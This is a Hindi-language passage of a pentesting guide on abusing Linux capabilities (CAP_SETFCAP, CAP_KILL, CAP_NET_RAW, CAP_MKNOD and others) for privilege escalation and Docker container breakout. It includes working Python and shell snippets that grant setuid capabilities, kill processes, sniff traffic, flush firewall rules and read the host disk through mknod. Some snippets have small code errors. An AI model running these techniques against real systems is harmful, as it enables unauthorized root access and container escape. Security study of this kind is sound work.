**बाइनरी के साथ उदाहरण**

यदि पायथन में यह **क्षमता** है, तो आप इसका दुरुपयोग करके आसानी से विशेषाधिकारों को जड़ सकते हैं:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
ध्यान दें कि यदि आप CAP\_SETFCAP के साथ नए क्षमता को बाइनरी में सेट करते हैं, तो आप इस क्षमता को खो देंगे।
{% endhint %}

[SETUID capability](linux-capabilities.md#cap\_setuid) को सेट करने के बाद आप उसके खंड में जा सकते हैं ताकि आप विशेषाधिकारों को उन्नत करने का तरीका देख सकें।

**परिस्थिति के साथ उदाहरण (Docker breakout)**

डॉकर कंटेनर के अंदर प्रक्रिया को डिफ़ॉल्ट रूप से **CAP\_SETFCAP क्षमता दी जाती है**। आप इसे जांच सकते हैं जैसे:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
यह क्षमता **बाइनरी को किसी अन्य क्षमता को देने की अनुमति देती है**, इसलिए हम **कंटेनर से बाहर निकल सकते हैं** जो इस पृष्ठ में उल्लिखित किसी अन्य क्षमता भंग का दुरुपयोग कर सकते हैं।\
हालांकि, यदि आप उदाहरण के लिए gdb बाइनरी को CAP\_SYS\_ADMIN और CAP\_SYS\_PTRACE क्षमताएँ देने की कोशिश करते हैं, तो आपको पता चलेगा कि आप उन्हें दे सकते हैं, लेकिन **इसके बाद बाइनरी को क्रियान्वित करने में सक्षम नहीं होगा**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[दस्तावेज़ से](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: यह एक **प्रभावी क्षमताओं के लिए सीमित उपसमूह है** जो धागे को मान सकता है। यह एक ऐसा सीमित उपसमूह भी है जिसे धागा अधिकारित सेट में **CAP\_SETPCAP** क्षमता नहीं है उसके द्वारा वार्तालापी सेट में जोड़ा जा सकता है।_\
ऐसा लगता है कि Permitted capabilities उन्हें सीमित करती है जो प्रयोग किए जा सकते हैं।\
हालांकि, Docker डिफ़ॉल्ट रूप से **CAP\_SETPCAP** भी प्रदान करता है, इसलिए आप **विरासत में नए क्षमताएँ सेट कर सकते हैं**।\
हालांकि, इस क्षमता की दस्तावेज़ में: _CAP\_SETPCAP: \[...\] **कॉलिंग धागे के बाउंडिंग सेट से किसी भी क्षमता को इसके विरासत में जोड़ें**_।\
ऐसा लगता है कि हम केवल बाउंडिंग सेट से विरासत में क्षमताएँ जोड़ सकते हैं। जिसका मतलब है कि **हम विरासत सेट में नई क्षमताएँ जैसे CAP\_SYS\_ADMIN या CAP\_SYS\_PTRACE जैसी क्षमताएँ नहीं डाल सकते हैं ताकि व्यवस्थाओं को उच्चाधिकार दिया जा सके**।

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) कई संवेदनशील ऑपरेशन प्रदान करता है जिसमें `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक पहुंच, `mmap_min_addr` को संशोधित करना, `ioperm(2)` और `iopl(2)` सिस्टम कॉल तक पहुंच, और विभिन्न डिस्क कमांड्स शामिल हैं। इस क्षमता के माध्यम से `FIBMAP ioctl(2)` भी सक्रिय होता है, जिसने [भूतकाल](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) में समस्याएँ उत्पन्न की हैं। मैन पेज के अनुसार, इससे धारक को अन्य उपकरणों पर विवरणात्मक रूप से `विभिन्न डिवाइस-विशिष्ट ऑपरेशन करने की अनुमति` भी होती है।

यह **उच्चाधिकार उन्नयन** और **Docker ब्रेकआउट** के लिए उपयोगी हो सकता है।

## CAP\_KILL

**इसका मतलब है कि किसी भी प्रक्रिया को मारना संभव है।**

**बाइनरी के साथ उदाहरण**

चलिए मान लेते हैं कि **`python`** बाइनरी में इस क्षमता है। यदि आप **कुछ सेवा या सॉकेट कॉन्फ़िगरेशन को भी संशोधित कर सकते हैं** (या किसी सेवा से संबंधित किसी भी कॉन्फ़िगरेशन फ़ाइल), तो आप उसमें बैकडोर डाल सकते हैं, और फिर उस सेवा से संबंधित प्रक्रिया को मार सकते हैं और नई कॉन्फ़िगरेशन फ़ाइल को अपने बैकडोर के साथ निष्पादित होने का इंतज़ार कर सकते हैं।
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**किल क्षमताओं के साथ Privesc**

यदि आपके पास किल क्षमताएं हैं और एक **नोड प्रोग्राम रूट के रूप में चल रहा है** (या एक विभिन्न उपयोगकर्ता के रूप में), तो आप संभावतः इसे **सिग्नल SIGUSR1** भेज सकते हैं और इसे **नोड डीबगर खोलने** के लिए मजबूर कर सकते हैं जहां आप कनेक्ट कर सकते हैं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने के मिशन के साथ**, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उफानन सम्मेलन है।

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**इसका मतलब है कि किसी भी पोर्ट पर सुनना संभव है (यहां तक कि विशेषाधिकारित पोर्टों पर भी)।** इस क्षमता के साथ आप सीधे विशेषाधिकारों को उन्नत नहीं कर सकते।

**बाइनरी के साथ उदाहरण**

यदि **`python`** के पास यह क्षमता है तो यह किसी भी पोर्ट पर सुन सकेगा और यहां से किसी भी अन्य पोर्ट पर कनेक्ट कर सकेगा (कुछ सेवाएं विशेषाधिकारित पोर्ट से कनेक्शन की आवश्यकता होती है)
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="कनेक्ट" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) क्षमता प्रक्रियाओं को **RAW और PACKET सॉकेट बनाने** की अनुमति देती है, जिससे उन्हें विभिन्न नेटवर्क पैकेट उत्पन्न करने और भेजने की क्षमता होती है। यह कंटेनरीकृत वातावरणों में सुरक्षा जोखिम बढ़ा सकता है, जैसे पैकेट स्पूफिंग, ट्रैफिक इंजेक्शन, और नेटवर्क पहुंच नियंत्रण को छलना। दुर्भाग्यपूर्ण कलाकार इसका दुरुपयोग करके कंटेनर रूटिंग में हस्तक्षेप कर सकते हैं या मेज़बान नेटवर्क सुरक्षा को कमजोर कर सकते हैं, विशेष रूप से पर्याप्त फ़ायरवॉल सुरक्षा के बिना। इसके अतिरिक्त, **CAP_NET_RAW** उच्चाधिकृत कंटेनरों के लिए महत्वपूर्ण है जो RAW ICMP अनुरोध के माध्यम से पिंग जैसी ऑपरेशन का समर्थन करने के लिए।

**इसका मतलब है कि ट्रैफिक को स्निफ़ किया जा सकता है।** इस क्षमता के साथ आप सीधे विशेषाधिकारों को बढ़ा नहीं सकते।

**बाइनरी के साथ उदाहरण**

यदि बाइनरी **`tcpdump`** के पास इस क्षमता है तो आप इसका उपयोग नेटवर्क सूचना कैप्चर करने के लिए कर सकेंगे।
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
ध्यान दें कि यदि **पर्यावरण** इस क्षमता को प्रदान कर रहा है तो आप **`tcpdump`** का उपयोग भी ट्रैफिक स्निफ करने के लिए कर सकते हैं।

**द्वितीय बाइनरी के साथ उदाहरण**

निम्नलिखित उदाहरण है **`python2`** कोड जो "**lo**" (**localhost**) इंटरफेस के ट्रैफिक को आड़ू से लेने के लिए उपयोगी हो सकता है। कोड लैब से है "_The Basics: CAP-NET\_BIND + NET\_RAW_" [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) क्षमता धारक को शक्ति प्रदान करती है **नेटवर्क कॉन्फ़िगरेशन में परिवर्तन करने** की, जैसे फ़ायरवॉल सेटिंग्स, रूटिंग टेबलें, सॉकेट अनुमतियाँ, और नेटवर्क इंटरफेस सेटिंग्स व्यक्त नेटवर्क नेमस्पेस के भीतर। यह नेटवर्क इंटरफेस पर **प्रोमिस्क्यूअस मोड** को चालू करने की भी अनुमति देती है, जिससे नेमस्पेस के अधिभाग में पैकेट स्निफ़ करने की अनुमति होती है।

**बाइनरी के साथ उदाहरण**

चलिए मान लेते हैं कि **पायथन बाइनरी** के पास ये क्षमताएँ हैं।
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**इसका मतलब है कि इनोड गुणों को संशोधित किया जा सकता है।** इस क्षमता के साथ आप सीधे विशेषाधिकारों को बढ़ा नहीं सकते।

**बाइनरी के साथ उदाहरण**

यदि आपको लगता है कि एक फ़ाइल अविकारी है और पायथन में यह क्षमता है, तो आप **अविकारी गुण हटा सकते हैं और फ़ाइल को संशोधनीय बना सकते हैं:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
ध्यान दें कि आम तौर पर यह अथवा निर्मित गुणसूची को इस्तेमाल करके हटाया जाता है:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) चलाने की अनुमति देता है `chroot(2)` सिस्टम कॉल, जो किसी विशेषता से `chroot(2)` environments से बाहर निकलने की संभावना देता है:

* [विभिन्न chroot समाधानों से बाहर निकलने का तरीका](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot बाहर निकलने का उपकरण](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) केवल `reboot(2)` सिस्टम कॉल का उपयोग सिस्टम पुनरारंभ के लिए अनुमति देता है, जिसमें विशेष आदेश जैसे कि `LINUX_REBOOT_CMD_RESTART2` निशुल्क हार्डवेयर प्लेटफॉर्म के लिए अनुकूलित हैं, लेकिन यह नए या साइन किए गए क्रैश कर्नल को लोड करने के लिए `kexec_load(2)` और, लिनक्स 3.17 से, `kexec_file_load(2)` का उपयोग करने की भी अनुमति देता है।

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) को लिनक्स 2.6.37 में व्यापक **CAP_SYS_ADMIN** से अलग किया गया था, विशेष रूप से `syslog(2)` कॉल का उपयोग करने की अनुमति देता है। यह क्षमता कर्नल पतों को `/proc` और समान इंटरफेस की दृश्यता सक्षम करती है जब `kptr_restrict` सेटिंग 1 पर होती है, जो कर्नल पतों का प्रकटीकरण नियंत्रित करता है। लिनक्स 2.6.39 से, `kptr_restrict` के लिए डिफ़ॉल्ट 0 है, जिसका मतलब है कि कर्नल पते प्रकट हैं, हालांकि कई वितरण इसे सुरक्षा कारणों से 1 (uid 0 को छोड़कर पते छुपाएं) या 2 (हमेशा पते छुपाएं) पर सेट करते हैं।

इसके अतिरिक्त, **CAP_SYSLOG** `dmesg_restrict` को 1 पर सेट करने पर `dmesg` आउटपुट तक पहुंचने की अनुमति देता है। इन परिवर्तनों के बावजूद, **CAP_SYS_ADMIN** ऐतिहासिक पूर्वाग्रहों के कारण `syslog` ऑपरेशन करने की क्षमता बनाए रखता है।

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `mknod` सिस्टम कॉल की क्षमता का विस्तार निर्मित फ़ाइलें बनाने के लिए निम्नलिखित के अतिरिक्त विशेष फ़ाइलों का निर्माण करने की अनुमति देता है:

- **S_IFCHR**: चरित्र विशेष फ़ाइलें, जो टर्मिनल की तरह उपकरण होती हैं।
- **S_IFBLK**: ब्लॉक विशेष फ़ाइलें, जो डिस्क की तरह उपकरण होती हैं।

यह क्षमता उन प्रक्रियाओं के लिए आवश्यक है जिन्हें उपकरण फ़ाइलें बनाने की क्षमता चाहिए, विशेष रूप से चरित्र या ब्लॉक उपकरणों के माध्यम से सीधा हार्डवेयर इंटरेक्शन को सुविधाजनक बनाने के लिए।

यह डिफ़ॉल्ट डॉकर क्षमता है ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।

यह क्षमता निम्नलिखित शर्तों के तहत मेज़बान पर विशेषाधिकार उन्नति (पूर्ण डिस्क पढ़ने के माध्यम से) करने की अनुमति देती है:

1. मेज़बान तक पहुंचना (अनविशेषित)।
2. कंटेनर तक पहुंचना (विशेषाधिकारी (EUID 0), और प्रभावी `CAP_MKNOD`।)
3. मेज़बान और कंटेनर को एक ही उपयोगकर्ता नेमस्पेस साझा करना चाहिए।

**कंटेनर में ब्लॉक उपकरण बनाने और उस तक पहुंचने के चरण:**

1. **मेज़बान पर एक स्टैंडर्ड उपयोगकर्ता के रूप में:**
- `id` के साथ अपनी वर्तमान उपयोगकर्ता आईडी निर्धारित करें, उदाहरण के लिए, `uid=1000(standarduser)`।
- लक्षित उपकरण की पहचान करें, उदाहरण के लिए, `/dev/sdb`।

2. **कंटेनर में `root` के रूप में:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **मेज़बान पर वापस:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
### CAP\_SETPCAP

**CAP_SETPCAP** एक प्रक्रिया को दूसरी प्रक्रिया की क्षमता सेट को **संशोधित करने** की अनुमति देता है, जिससे प्रभावी, विरासत में लेने और अनुमत सेट से क्षमताओं को जोड़ने या हटाने की अनुमति मिलती है। हालांकि, एक प्रक्रिया केवल उन क्षमताओं को संशोधित कर सकती है जो उसके अपने अनुमत सेट में हैं, यह सुनिश्चित करते हुए कि यह दूसरी प्रक्रिया की विशेषाधिकारों को अपने से अधिक उच्च नहीं कर सकती। हाल के कर्नेल अपडेट्स ने इन नियमों को मजबूत किया है, `CAP_SETPCAP` को केवल अपने या उसके वंशजों की अनुमत सेट के भीतर क्षमताओं को कम करने के लिए सीमित किया है, सुरक्षा जोखिमों को कम करने का लक्ष्य रखते हुए। उपयोग करने के लिए `CAP_SETPCAP` को प्रभावी सेट में और लक्ष्य क्षमताओं को अनुमत सेट में होना चाहिए, संशोधन के लिए `capset()` का उपयोग करते हुए। यह `CAP_SETPCAP` की मुख्य कार्यक्षमता और सीमाएं का सारांश है, जिसमें इसकी विशेषता प्रबंधन और सुरक्षा वृद्धि में भूमिका को हाइलाइट किया गया है।
